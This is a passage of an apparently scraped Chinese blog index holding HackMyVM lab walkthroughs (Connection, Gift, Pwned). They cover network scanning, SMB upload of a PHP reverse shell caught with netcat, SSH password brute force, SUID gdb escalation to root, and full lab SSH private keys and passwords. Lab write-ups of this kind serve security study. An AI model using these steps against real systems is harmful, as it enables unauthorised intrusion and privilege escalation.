class=\"line\">YQngA5crv7m/vHhvy+4bnMrSVNXGkMQETx9o+PdRoexrUlRVoOeBMiQJrpUEgK8bQMJx8v</span><br><span class=\"line\">zEcGkJIh+gd+mqY6lZP+lZe8Yje2T8q79JNjsDLwe1KCioJx/cX6Vv0n2TAqEWD14s7lAO</span><br><span class=\"line\">4W6NvUI3uBTLzGGA1qdRWLIJlHCfunH4N9T6exxIR8bXOB+CqfaEJsFipo/SMGBZxUvpig</span><br><span class=\"line\">yLAJLeOGZ4UbgL+nnWPeAjpvzLP1pL4O11OkPBAAAAAwEAAQAAAQBIArRoQOGJh9AMWBS6</span><br><span class=\"line\">oBgUC+lw4Ptq710Q7sOAFMxE7BnEsFZeI62TgZqqpNkdHjr2xuT1ME5YpK5niMzFkkIEd5</span><br><span class=\"line\">SEwK6rKRfUcB3lyZWaoMoIBJ1pZoY1c2qYw1KTb3hVUEbgsmRugIhwWGC+anFfavaJCMDr</span><br><span class=\"line\">nCO2g8VMnT/cTyAv/Qmi8m868KNEzcuzGV5ozHl1XLffHM9R/cqPPyAYaQIa9Z+kS6ou9R</span><br><span class=\"line\">iMTjTSxOPnfh286kgx0ry1se9BBlrEc5251R/PRkEKYrMj3AIwI30qvYlAtNfcCFhoJXLq</span><br><span class=\"line\">vWystPARwiUs7WYBUHRf6bPP/pHTTvwwb2bs51ngImpdAAAAgDaWnQ7Lj7Vp+mTjhSu4oG</span><br><span class=\"line\">ptDHNd2uuqB1+CHRcaVutUmknxvxG3p957UbvNp6e0+ePKtAIakrzbpAo6u25poyWugAuz</span><br><span class=\"line\">X2nQhqsQh6yrThDJlTiDMeV7JNGFbGOcanXXXHt3tjfyrS0+aM87WmwqNyh6nfgy1C5axR</span><br><span class=\"line\">fKZG8ivz5iAAAAgQD83QmCIcbZaCOlGwgHGcuCUDcxGY1QlIRnbM5VAjimNezGFs9f0ExD</span><br><span class=\"line\">SiTwFsmITP//njsbRZP2laiKKO6j4yp5LpfgDB5QHs+g4nXvDn6ns64gCKo7tf2bPP8VCe</span><br><span class=\"line\">FWyc2JyqREwE3WmyhkPlyr9xAZerZ+7Fz+NFueRYzDklWg8wAAAIEAxhBeLqbo6/GUKXF5</span><br><span class=\"line\">rFRatLXI43Jrd9pyvLx62KghsnEBEk7my9sbU5dvYBLztS+lfPCRxV2ZzpjYdN4SDJbXIR</span><br><span class=\"line\">txBaLJe3c4uIc9WjyxGwUK9IL65rSrRVERHsTO525ofPWGQEa2A+pRCpz3A4Y41fy8Y9an</span><br><span class=\"line\">2B2NmfTAfEkWFXsAAAALcm9vdEBiYXNlbWU=</span><br><span class=\"line\">-----END OPENSSH PRIVATE KEY-----</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class=\"line\">└─# ssh root@192.168.31.232 -i id_rsa</span><br><span class=\"line\">Linux MiWiFi-RA71-srv 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64</span><br><span class=\"line\"></span><br><span class=\"line\">The programs included with the Debian GNU/Linux system are free software;</span><br><span class=\"line\">the exact distribution terms for each program are described in the</span><br><span class=\"line\">individual files in /usr/share/doc/*/copyright.</span><br><span class=\"line\"></span><br><span class=\"line\">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class=\"line\">permitted by applicable law.</span><br><span class=\"line\">Last login: Wed Jan 22 08:08:11 2025 from 192.168.31.129</span><br><span class=\"line\">root@MiWiFi-RA71-srv:~#</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h1><p>在处理字典的时候还可以有更高效的方法，其他的就没啥了</p>\n","categories":["HackMyVM"],"tags":["靶机"]},{"title":"HackmyVM-Connection","url":"/2025/01/22/HackmyVM-Connection/","content":"<h1 id=\"信息搜集\"><a href=\"#信息搜集\" class=\"headerlink\" title=\"信息搜集\"></a>信息搜集</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌──(root㉿kali)-[~/Desktop/script]</span><br><span class=\"line\">└─# arp-scan -l</span><br><span class=\"line\">Interface: eth0, type: EN10MB, MAC: 00:0c:29:7d:7d:cf, IPv4: 192.168.31.129</span><br><span class=\"line\">Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class=\"line\">192.168.31.1    a4:a9:30:df:ef:44       (Unknown)</span><br><span class=\"line\">192.168.31.77   08:00:27:2a:5f:aa       PCS Systemtechnik GmbH</span><br><span class=\"line\">192.168.31.220  46:3e:62:f9:1e:fa       (Unknown: locally administered)</span><br><span class=\"line\">192.168.31.187  a6:9b:e0:2d:30:9a       (Unknown: locally administered)</span><br><span class=\"line\">192.168.31.85   7e:2c:58:df:4e:cb       (Unknown: locally administered)</span><br><span class=\"line\"></span><br><span class=\"line\">5 packets received by filter, 0 packets dropped by kernel</span><br><span class=\"line\">Ending arp-scan 1.10.0: 256 hosts scanned in 1.984 seconds (129.03 hosts/sec). 5 responded</span><br></pre></td></tr></table></figure>\n\n<p>ip为192.168.31.77，nmap扫描端口</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌──(root㉿kali)-[~/Desktop/script]</span><br><span class=\"line\">└─# nmap 192.168.31.77 --min-rate=1000 -p-</span><br><span class=\"line\">Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-22 09:09 EST</span><br><span class=\"line\">Nmap scan report for connection (192.168.31.77)</span><br><span class=\"line\">Host is up (0.00064s latency).</span><br><span class=\"line\">Not shown: 65531 closed tcp ports (reset)</span><br><span class=\"line\">PORT    STATE SERVICE</span><br><span class=\"line\">22/tcp  open  ssh</span><br><span class=\"line\">80/tcp  open  http</span><br><span class=\"line\">139/tcp open  netbios-ssn</span><br><span class=\"line\">445/tcp open  microsoft-ds</span><br><span class=\"line\">MAC Address: 08:00:27:2A:5F:AA (Oracle VirtualBox virtual NIC)</span><br><span class=\"line\"></span><br><span class=\"line\">Nmap done: 1 IP address (1 host up) scanned in 11.11 seconds</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"445端口\"><a href=\"#445端口\" class=\"headerlink\" title=\"445端口\"></a>445端口</h1><p>开启了445端口</p>\n<p>用enum4linux进行枚举</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"> =================================( Share Enumeration on 192.168.31.77 )=================================</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">        Sharename       Type      Comment</span><br><span class=\"line\">        ---------       ----      -------</span><br><span class=\"line\">        share           Disk</span><br><span class=\"line\">        print$          Disk      Printer Drivers</span><br><span class=\"line\">        IPC$            IPC       IPC Service (Private Share for uploading files)</span><br><span class=\"line\">Reconnecting with SMB1 for workgroup listing.</span><br><span class=\"line\"></span><br><span class=\"line\">        Server               Comment</span><br><span class=\"line\">        ---------            -------</span><br><span class=\"line\"></span><br><span class=\"line\">        Workgroup            Master</span><br><span class=\"line\">        ---------            -------</span><br><span class=\"line\">        WORKGROUP            CONNECTION</span><br><span class=\"line\"></span><br><span class=\"line\">[+] Attempting to map shares on 192.168.31.77</span><br><span class=\"line\"></span><br><span class=\"line\">//192.168.31.77/share   Mapping: OK Listing: OK Writing: N/A</span><br><span class=\"line\">//192.168.31.77/print$  Mapping: DENIED Listing: N/A Writing: N/A</span><br><span class=\"line\"></span><br><span class=\"line\">[E] Can&#x27;t understand response:</span><br><span class=\"line\"></span><br><span class=\"line\">NT_STATUS_OBJECT_NAME_NOT_FOUND listing \\*</span><br><span class=\"line\">//192.168.31.77/IPC$    Mapping: N/A Listing: N/A Writing: N/A</span><br></pre></td></tr></table></figure>\n\n<p>smbclint可以匿名登陆share里有一个html，随便往里传一个文件发现在80端口访问到，传一个反弹shell的php文件</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌──(root㉿kali)-[~/Desktop/script]</span><br><span class=\"line\">└─# smbclient  //192.168.31.77/share</span><br><span class=\"line\">Password for [WORKGROUP\\root]:</span><br><span class=\"line\">Anonymous login successful</span><br><span class=\"line\">smb: \\&gt; cd html\\</span><br><span class=\"line\">smb: \\html\\&gt;</span><br><span class=\"line\">smb: \\html\\&gt; put rev.php</span><br><span class=\"line\">putting file rev.php as \\html\\rev.php (447.0 kb/s) (average 447.0 kb/s)</span><br><span class=\"line\">smb: \\html\\&gt; exit</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌──(root㉿kali)-[~/Desktop/script]</span><br><span class=\"line\">└─# nc -lvnp 5555</span><br><span class=\"line\">listening on [any] 5555 ...</span><br><span class=\"line\">connect to [192.168.31.129] from (UNKNOWN) [192.168.31.77] 45632</span><br><span class=\"line\">Linux connection 4.19.0-10-amd64 #1 SMP Debian 4.19.132-1 (2020-07-24) x86_64 GNU/Linux</span><br><span class=\"line\"> 09:12:44 up 4 min,  0 users,  load average: 0.00, 0.00, 0.00</span><br><span class=\"line\">USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT</span><br><span class=\"line\">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class=\"line\">/bin/sh: 0: can&#x27;t access tty; job control turned off</span><br><span class=\"line\">$</span><br></pre></td></tr></table></figure>\n\n<p>接收到shell了</p>\n<h1 id=\"提权\"><a href=\"#提权\" class=\"headerlink\" title=\"提权\"></a>提权</h1><p>用python获得一个更好的终端</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">$  python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class=\"line\">www-data@connection:/$</span><br></pre></td></tr></table></figure>\n\n<p>查找suid文件</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">www-data@connection:/$ find / -perm -u=s 2&gt;/dev/null</span><br><span class=\"line\">find / -perm -u=s 2&gt;/dev/null</span><br><span class=\"line\">/usr/lib/eject/dmcrypt-get-device</span><br><span class=\"line\">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class=\"line\">/usr/lib/openssh/ssh-keysign</span><br><span class=\"line\">/usr/bin/newgrp</span><br><span class=\"line\">/usr/bin/umount</span><br><span class=\"line\">/usr/bin/su</span><br><span class=\"line\">/usr/bin/passwd</span><br><span class=\"line\">/usr/bin/gdb</span><br><span class=\"line\">/usr/bin/chsh</span><br><span class=\"line\">/usr/bin/chfn</span><br><span class=\"line\">/usr/bin/mount</span><br><span class=\"line\">/usr/bin/gpassw</span><br></pre></td></tr></table></figure>\n\n<p>可以利用gdb进行suid提权</p>\n<p><a href=\"https://gtfobins.github.io/gtfobins/gdb/\">https://gtfobins.github.io/gtfobins/gdb/</a></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">www-data@connection:/$ gdb -nx -ex &#x27;python import os; os.execl(&quot;/bin/sh&quot;, &quot;sh&quot;, &quot;-p&quot;)&#x27; -ex quit</span><br><span class=\"line\">&lt;mport os; os.execl(&quot;/bin/sh&quot;, &quot;sh&quot;, &quot;-p&quot;)&#x27; -ex quit</span><br><span class=\"line\">GNU gdb (Debian 8.2.1-2+b3) 8.2.1</span><br><span class=\"line\">Copyright (C) 2018 Free Software Foundation, Inc.</span><br><span class=\"line\">License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;</span><br><span class=\"line\">This is free software: you are free to change and redistribute it.</span><br><span class=\"line\">There is NO WARRANTY, to the extent permitted by law.</span><br><span class=\"line\">Type &quot;show copying&quot; and &quot;show warranty&quot; for details.</span><br><span class=\"line\">This GDB was configured as &quot;x86_64-linux-gnu&quot;.</span><br><span class=\"line\">Type &quot;show configuration&quot; for configuration details.</span><br><span class=\"line\">For bug reporting instructions, please see:</span><br><span class=\"line\">&lt;http://www.gnu.org/software/gdb/bugs/&gt;.</span><br><span class=\"line\">Find the GDB manual and other documentation resources online at:</span><br><span class=\"line\">    &lt;http://www.gnu.org/software/gdb/documentation/&gt;.</span><br><span class=\"line\"></span><br><span class=\"line\">For help, type &quot;help&quot;.</span><br><span class=\"line\">Type &quot;apropos word&quot; to search for commands related to &quot;word&quot;.</span><br><span class=\"line\"># id</span><br><span class=\"line\">id</span><br><span class=\"line\">uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)</span><br></pre></td></tr></table></figure>\n\n<p>发现进到root组里了，提权结束</p>\n","categories":["HackMyVM"],"tags":["靶机"]},{"title":"HackmyVM-Gift","url":"/2025/01/22/HackmyVM-Gift/","content":"<h1 id=\"信息搜集\"><a href=\"#信息搜集\" class=\"headerlink\" title=\"信息搜集\"></a>信息搜集</h1><p>用arp-scan扫描</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌──(root㉿kali)-[~]</span><br><span class=\"line\">└─# arp-scan -l</span><br><span class=\"line\">Interface: eth0, type: EN10MB, MAC: 00:0c:29:7d:7d:cf, IPv4: 192.168.31.129</span><br><span class=\"line\">Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class=\"line\">192.168.31.1    a4:a9:30:df:ef:44       (Unknown)</span><br><span class=\"line\">192.168.31.200  08:00:27:5f:2f:1e       PCS Systemtechnik GmbH</span><br><span class=\"line\">192.168.31.220  46:3e:62:f9:1e:fa       (Unknown: locally administered)</span><br><span class=\"line\">192.168.31.187  a6:9b:e0:2d:30:9a       (Unknown: locally administered)</span><br><span class=\"line\">192.168.31.217  b4:0f:b3:8e:31:07       vivo Mobile Communication Co., Ltd.</span><br><span class=\"line\"></span><br><span class=\"line\">5 packets received by filter, 0 packets dropped by kernel</span><br><span class=\"line\">Ending arp-scan 1.10.0: 256 hosts scanned in 1.995 seconds (128.32 hosts/sec). 5 responded</span><br></pre></td></tr></table></figure>\n\n<p>ip地址为192.168.31.200，然后nmap扫描开放的端口</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class=\"line\">└─# nmap 192.168.31.200 --min-rate=1000</span><br><span class=\"line\">Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-22 00:40 EST</span><br><span class=\"line\">Nmap scan report for gift (192.168.31.200)</span><br><span class=\"line\">Host is up (0.0080s latency).</span><br><span class=\"line\">Not shown: 998 closed tcp ports (reset)</span><br><span class=\"line\">PORT   STATE SERVICE</span><br><span class=\"line\">22/tcp open  ssh</span><br><span class=\"line\">80/tcp open  http</span><br><span class=\"line\">MAC Address: 08:00:27:5F:2F:1E (Oracle VirtualBox virtual NIC)</span><br><span class=\"line\"></span><br><span class=\"line\">Nmap done: 1 IP address (1 host up) scanned in 6.96 seconds</span><br></pre></td></tr></table></figure>\n\n<p>只开启了22和80端口</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class=\"line\">└─# curl http://192.168.31.200/</span><br><span class=\"line\"></span><br><span class=\"line\">Dont Overthink. Really, Its simple.</span><br><span class=\"line\">        &lt;!-- Trust me --&gt;</span><br></pre></td></tr></table></figure>\n\n<p>目录扫描也只有一个index.html,80端口没有入口点，只能找22端口,用hydra爆破root密码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">[22][ssh] host: 192.168.31.200   login: root   password: simple</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"SSH登录\"><a href=\"#SSH登录\" class=\"headerlink\" title=\"SSH登录\"></a>SSH登录</h1><p>ssh <a href=\"mailto:&#x72;&#x6f;&#x6f;&#x74;&#x40;&#49;&#57;&#50;&#46;&#x31;&#54;&#56;&#x2e;&#x33;&#49;&#x2e;&#50;&#x30;&#48;\">&#x72;&#x6f;&#x6f;&#x74;&#x40;&#49;&#57;&#50;&#46;&#x31;&#54;&#56;&#x2e;&#x33;&#49;&#x2e;&#50;&#x30;&#48;</a></p>\n<p>能直接查看root.txt和user.txt</p>\n<h1 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h1><p>Dont Overthink. Really, Its simple.，Easy靶场,hydra直接爆破没什么好说的</p>\n","categories":["HackMyVM"],"tags":["靶机"]},{"title":"HackmyVM-Pwned","url":"/2025/01/22/HackmyVM-Pwned/","content":"<h1 id=\"信息搜集\"><a href=\"#信息搜集\" class=\"headerlink\" title=\"信息搜集\"></a>信息搜集</h1><p>arp-scan -l扫描ip</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class=\"line\">└─# arp-scan -l</span><br><span class=\"line\">Interface: eth0, type: EN10MB, MAC: 00:0c:29:7d:7d:cf, IPv4: 192.168.31.129</span><br><span class=\"line\">Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class=\"line\">192.168.31.1    a4:a9:30:df:ef:44       (Unknown)</span><br><span class=\"line\">192.168.31.51   08:00:27:c4:72:27       PCS Systemtechnik GmbH</span><br><span class=\"line\">192.168.31.220  46:3e:62:f9:1e:fa       (Unknown: locally administered)</span><br><span class=\"line\">192.168.31.187  a6:9b:e0:2d:30:9a       (Unknown: locally administered)</span><br><span class=\"line\">192.168.31.85   7e:2c:58:df:4e:cb       (Unknown: locally administered)</span><br><span class=\"line\"></span><br><span class=\"line\">5 packets received by filter, 0 packets dropped by kernel</span><br><span class=\"line\">Ending arp-scan 1.10.0: 256 hosts scanned in 1.986 seconds (128.90 hosts/sec). 5 responded</span><br></pre></td></tr></table></figure>\n\n<p>ip为192.168.31.51，然后nmap扫描开放端口</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class=\"line\">└─# nmap 192.168.31.51 --min-rate=1000 -p-</span><br><span class=\"line\">Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-22 01:21 EST</span><br><span class=\"line\">Nmap scan report for pwned (192.168.31.51)</span><br><span class=\"line\">Host is up (0.00019s latency).</span><br><span class=\"line\">Not shown: 65532 closed tcp ports (reset)</span><br><span class=\"line\">PORT   STATE SERVICE</span><br><span class=\"line\">21/tcp open  ftp</span><br><span class=\"line\">22/tcp open  ssh</span><br><span class=\"line\">80/tcp open  http</span><br><span class=\"line\">MAC Address: 08:00:27:C4:72:27 (Oracle VirtualBox virtual NIC)</span><br><span class=\"line\"></span><br><span class=\"line\">Nmap done: 1 IP address (1 host up) scanned in 13.85 seconds</span><br></pre></td></tr></table></figure>\n\n<p>开放了21,22,80端口</p>\n<h1 id=\"80端口\"><a href=\"#80端口\" class=\"headerlink\" title=\"80端口\"></a>80端口</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class=\"line\">└─# gobuster dir -u &quot;http://192.168.31.51&quot; -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt</span><br><span class=\"line\">===============================================================</span><br><span class=\"line\">Gobuster v3.6</span><br><span class=\"line\">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class=\"line\">===============================================================</span><br><span class=\"line\">[+] Url:                     http://192.168.31.51</span><br><span class=\"line\">[+] Method:                  GET</span><br><span class=\"line\">[+] Threads:                 10</span><br><span class=\"line\">[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt</span><br><span class=\"line\">[+] Negative Status codes:   404</span><br><span class=\"line\">[+] User Agent:              gobuster/3.6</span><br><span class=\"line\">[+] Timeout:                 10s</span><br><span class=\"line\">===============================================================</span><br><span class=\"line\">Starting gobuster in directory enumeration mode</span><br><span class=\"line\">===============================================================</span><br><span class=\"line\">/nothing              (Status: 301) [Size: 316] [--&gt; http://192.168.31.51/nothing/]</span><br><span class=\"line\">/server-status        (Status: 403) [Size: 278]</span><br><span class=\"line\">/hidden_text          (Status: 301) [Size: 320] [--&gt; http://192.168.31.51/hidden_text/]</span><br><span class=\"line\">Progress: 220559 / 220560 (100.00%)</span><br><span class=\"line\">===============================================================</span><br><span class=\"line\">Finished</span><br><span class=\"line\">===============================================================</span><br></pre></td></tr></table></figure>\n\n<p>/nothing:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">i said nothing bro</span><br></pre></td></tr></table></figure>\n\n<p>/hidden_text:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">/hacked</span><br><span class=\"line\">/vanakam_nanba</span><br><span class=\"line\">/hackerman.gif </span><br><span class=\"line\">/facebook</span><br><span class=\"line\">/whatsapp</span><br><span class=\"line\">/instagram</span><br><span class=\"line\">/pwned</span><br><span class=\"line\">/pwned.com</span><br><span class=\"line\">/pubg </span><br><span class=\"line\">/cod</span><br><span class=\"line\">/fortnite</span><br><span class=\"line\">/youtube</span><br><span class=\"line\">/kali.org</span><br><span class=\"line\">/hacked.vuln</span><br><span class=\"line\">/users.vuln</span><br><span class=\"line\">/passwd.vuln</span><br><span class=\"line\">/pwned.vuln</span><br><span class=\"line\">/backup.vuln</span><br><span class=\"line\">/.ssh</span><br><span class=\"line\">/root</span><br><span class=\"line\">/home</span><br></pre></td></tr></table></figure>\n\n<p>利用给的目录扫描</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class=\"line\">└─# gobuster dir -u &quot;http://192.168.31.51&quot; -w ./secret.dic</span><br><span class=\"line\">===============================================================</span><br><span class=\"line\">Gobuster v3.6</span><br><span class=\"line\">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class=\"line\">===============================================================</span><br><span class=\"line\">[+] Url:                     http://192.168.31.51</span><br><span class=\"line\">[+] Method:                  GET</span><br><span class=\"line\">[+] Threads:                 10</span><br><span class=\"line\">[+] Wordlist:                ./secret.dic</span><br><span class=\"line\">[+] Negative Status codes:   404</span><br><span class=\"line\">[+] User Agent:              gobuster/3.6</span><br><span class=\"line\">[+] Timeout:                 10s</span><br><span class=\"line\">===============================================================</span><br><span class=\"line\">Starting gobuster in directory enumeration mode</span><br><span class=\"line\">===============================================================</span><br><span class=\"line\">/pwned.vuln           (Status: 301) [Size: 319] [--&gt; http://192.168.31.51/pwned.vuln/]</span><br><span class=\"line\">Progress: 22 / 23 (95.65%)</span><br><span class=\"line\">===============================================================</span><br><span class=\"line\">Finished</span><br><span class=\"line\">===============================================================</span><br></pre></td></tr></table></figure>\n\n<p>前端给了源码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">//\tif (isset($_POST[&#x27;submit&#x27;])) &#123;</span><br><span class=\"line\">//\t\t$un=$_POST[&#x27;username&#x27;];</span><br><span class=\"line\">//\t\t$pw=$_POST[&#x27;password&#x27;];</span><br><span class=\"line\">//</span><br><span class=\"line\">//\tif ($un==&#x27;ftpuser&#x27; &amp;&amp; $pw==&#x27;B0ss_B!TcH&#x27;) &#123;</span><br><span class=\"line\">//\t\techo &quot;welcome&quot;</span><br><span class=\"line\">//\t\texit();</span><br><span class=\"line\">// &#125;</span><br><span class=\"line\">// else </span><br><span class=\"line\">//\techo &quot;Invalid creds&quot;</span><br><span class=\"line\">// &#125;</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>这是ftp的账号然后登录ftp</p>\n<h1 id=\"21端口\"><a href=\"#21端口\" class=\"headerlink\" title=\"21端口\"></a>21端口</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">ftp&gt; ls -la</span><br><span class=\"line\">229 Entering Extended Passive Mode (|||48619|)</span><br><span class=\"line\">150 Here comes the directory listing.</span><br><span class=\"line\">drwxrwxrwx    3 0        0            4096 Jul 09  2020 .</span><br><span class=\"line\">drwxr-xr-x    5 0        0            4096 Jul 10  2020 ..</span><br><span class=\"line\">drwxr-xr-x    2 0        0            4096 Jul 10  2020 share</span><br></pre></td></tr></table></figure>\n\n<p>有一个share文件夹，文件夹有id_rsa和note.txt</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">ftp&gt; ls</span><br><span class=\"line\">229 Entering Extended Passive Mode (|||53927|)</span><br><span class=\"line\">150 Here comes the directory listing.</span><br><span class=\"line\">-rw-r--r--    1 0        0            2602 Jul 09  2020 id_rsa</span><br><span class=\"line\">-rw-r--r--    1 0        0              75 Jul 09  2020 note.txt</span><br><span class=\"line\">226 Directory send OK.</span><br></pre></td></tr></table></figure>\n\n<p>get下载下来</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">ftp&gt; get id_rsa</span><br><span class=\"line\">local: id_rsa remote: id_rsa</span><br><span class=\"line\">229 Entering Extended Passive Mode (|||26918|)</span><br><span class=\"line\">150 Opening BINARY mode data connection for id_rsa (2602 bytes).</span><br><span class=\"line\">100% |***************************************************************************|  2602      350.29 KiB/s    00:00 ETA</span><br><span class=\"line\">226 Transfer complete.</span><br><span class=\"line\">2602 bytes received in 00:00 (308.45 KiB/s)</span><br><span class=\"line\">ftp&gt; get note.txt</span><br><span class=\"line\">local: note.txt remote: note.txt</span><br><span class=\"line\">229 Entering Extended Passive Mode (|||52418|)</span><br><span class=\"line\">150 Opening BINARY mode data connection for note.txt (75 bytes).</span><br><span class=\"line\">100% |***************************************************************************|    75       34.79 KiB/s    00:00 ETA</span><br><span class=\"line\">226 Transfer complete.</span><br><span class=\"line\">75 bytes received in 00:00 (21.66 KiB/s)</span><br></pre></td></tr></table></figure>\n\n<p>文件内容</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class=\"line\">└─# cat id_rsa</span><br><span class=\"line\">-----BEGIN OPENSSH PRIVATE KEY-----</span><br><span class=\"line\">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn</span><br><span class=\"line\">NhAAAAAwEAAQAAAYEAthncqHSPVcE7xs136G/G7duiV6wULU+1Y906aF3ltGpht/sXByPB</span><br><span class=\"line\">aEzxOfqRXlQfkk7hpSYk8FCAibxddTGkd5YpcSH7U145sc2n7jwv0swjMu1ml+B5Vra7JJ</span><br><span class=\"line\">0cP/I27BcjMy7BxRpugZQJP214jiEixOK6gxTILZRAfHedblnd2rW6PhRcQK++jcEFM+ur</span><br><span class=\"line\">gaaktNdFyK4deT+YHghsYAUi/zyWcvqSOGy9iwO62w4TvMfYRaIL7hzhtvR6Ze6aBypqhV</span><br><span class=\"line\">m1C6YIIddYcJuXCV/DgiWXTIUQnhl38/Hxp0lzkhcN8muzOAmFMehktm3bX+y01jX+LziU</span><br><span class=\"line\">GDYM7cTQitZ0MhPDMwIoR0L89mjP4lVyX4A0kn/MxQaj4IxQnY7QG4D4C1bMIYJ0IA//k9</span><br><span class=\"line\">d4h0SNcEOlgDCZ0yCLZQeN3LSBe2IR4qFmdavyXJfb0Nzn5jhfVUchz9N9S8prP6+y3exZ</span><br><span class=\"line\">ADnomqLN1eMcsmu8z5v7w0q7Iv3vS2XMc/c7deZDAAAFiH5GUFF+RlBRAAAAB3NzaC1yc2</span><br><span class=\"line\">EAAAGBALYZ3Kh0j1XBO8bNd+hvxu3bolesFC1PtWPdOmhd5bRqYbf7FwcjwWhM8Tn6kV5U</span><br><span class=\"line\">H5JO4aUmJPBQgIm8XXUxpHeWKXEh+1NeObHNp+48L9LMIzLtZpfgeVa2uySdHD/yNuwXIz</span><br><span class=\"line\">MuwcUaboGUCT9teI4hIsTiuoMUyC2UQHx3nW5Z3dq1uj4UXECvvo3BBTPrq4GmpLTXRciu</span><br><span class=\"line\">HXk/mB4IbGAFIv88lnL6kjhsvYsDutsOE7zH2EWiC+4c4bb0emXumgcqaoVZtQumCCHXWH</span><br><span class=\"line\">Cblwlfw4Ill0yFEJ4Zd/Px8adJc5IXDfJrszgJhTHoZLZt21/stNY1/i84lBg2DO3E0IrW</span><br><span class=\"line\">dDITwzMCKEdC/PZoz+JVcl+ANJJ/zMUGo+CMUJ2O0BuA+AtWzCGCdCAP/5PXeIdEjXBDpY</span><br><span class=\"line\">AwmdMgi2UHjdy0gXtiEeKhZnWr8lyX29Dc5+Y4X1VHIc/TfUvKaz+vst3sWQA56JqizdXj</span><br><span class=\"line\">HLJrvM+b+8NKuyL970tlzHP3O3XmQwAAAAMBAAEAAAGACQ18FLvGrGKw0A9C2MFFyGlUxr</span><br><span class=\"line\">r9Pctqnw5OawXP94oaVYUb/fTfFopMq68zLtdLwoA9Y3Jj/7ZgzXgZxUu0e2VxpfgkgF58</span><br><span class=\"line\">y8QHhyZi0j3nug5nPUGhhpgK8aUF1H/8DvyPeWnnpB7OQ47Sbt7IUXiAO/1xfDa6RNnL4u</span><br><span class=\"line\">QnZWb+SnMiURe+BlE2TeG8mnoqyoU4Ru00wOc2++IXc9bDXHqk5L9kU071mex99701utIW</span><br><span class=\"line\">VRoyPDP0F+BDsE6zDwIvfJZxY2nVAZkdxZ+lit5XCSUuNr6zZWBBu9yAwVBaeuqGeZtiFN</span><br><span 